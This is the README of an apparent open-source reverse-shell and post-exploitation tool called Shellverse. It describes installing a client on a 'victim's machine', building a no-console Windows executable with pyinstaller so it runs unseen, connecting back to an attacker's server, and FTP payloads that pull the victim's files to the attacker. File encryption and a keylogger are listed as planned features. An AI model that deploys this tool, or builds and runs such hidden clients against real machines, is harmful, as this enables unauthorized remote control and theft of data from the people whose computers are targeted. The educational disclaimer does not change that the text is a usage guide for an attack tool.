# Shellverse

## Overview

- Shellverse is a simple multi-client Remote Administration Tool and a post-exploitation tool.
- Shellverse gives the attacker a reverse shell together with configured payloads once it has been installed on the victims machine.
- **Disclaimer**: Accessing a computer without authorization or permission is illegal, atleast in my country it is. This should only be used for educational / proof of concept purpose.
- I wote most of this code years ago when learning python, i'll try to clean the code as much as I can. Feel free to contribute by writing payloads and making pull requests.

## Features
* [x] Reverse shell.
* [x] Download files from the client's PC
* [x] Upload files to the client's PC
* [ ] webcam snap & webcam livestream.
* [ ] record audio & stream audio.
* [ ] Take screenshots 
* [ ] Encrypt files on the clients PC.
* [ ] Change the client's wallpaper.
* [ ] Keylogger.

## Supported Platforms
- The `reverse shell` payload has been tested on linux & windows computers.
- The other payloads such as `screenshot` & `wallpaper-changing` have only been tested on windows.

## Setup/ Installation requirements
### Requirements
* Python 3.
* create and activate a virtual environment
```
python -m venv virtual
#unix
source virtual/bin/activate
#windows cmd
virtual\Scripts\activate
```
* `pip install -r requirements.txt`

## Usage

### Server
- `python runserver.py` for the server to listen for connections.
- edit `server/settings.py` to configure TCP server and FTP server settings.
- Enter Host/Server address, to get an interactive prompt where you are able to view connected clients, select a specific client, and get a reverse shell

For help
```
shellverse> help
help:	Shows this help list
list:	show  connected targets
about:	print details about shellverse
show payloads:	show additional payloads
select:	Selects a target by its index. Takes index as a parameter
quit:	Stops current connection with a target. To be used when target is selected
shutdown:	Shuts server down
```
### Client & server - getting a reverse shell.
- First edit the clients configurations in `client/settings.py`.
```python
......
SERVER_ADDR= '127.0.0.1' # server address
SERVER_PORT=999 #server port, should be an integer not string
RETRY_TIME=5 #in seconds
......
```
- `python shellverse.py` on the client machine to make a tcp socket connection to the server
- check the running server instance and connect to client using `select` command.

### Payloads
- The new version of shellverse makes it very easy to use and write new payloads.
- Refer to `payloads/abstract_payload_handler.py` to see how to write a payload class.
- To uses a payload add it to the payload registry in `payloads/payload_register.py`.
- Only payloads whose platform match the configured platform in `client/settings.py` will be selected.
- Shellverse comes with some payload examples, you can easily add yours by implementing `AbstractPayloadHandler` interface.
- When I get time i'll write a wiki for this payloads
```
[1]ftp-upload: uploads a file from the attackers ftp server to the victims computer.
          usage~ upload ftpserver ftpuser ftp-password file-path

[2]ftp-download: downloads a file/folder from the victims computer to our ftp server.
            usage~download ftpserver ftpuser ftp-password file-path
```

### Making a windows executable and getting a reverse connection
- You can make a noconsole exe to run on the target.
`pyinstaller --noconsole --onefile shellverse.py`
run `pyinstaller --help` for more options such as an icon for the exe file.

### Getting a reverse connection
- Execute the exe in the targets machine, run the server script on the Host machine and a wait a reverse connection.
```
shellverse> 
Connection has been established: DESKTOP-R5UIHJE (192.168.0.31)
```

## Contributing
- Fork  the repo, add payloads(using the documented method) / fix bugs or any other contribution, and make a pull request.

## License
This project is Licensed under the MIT open source license
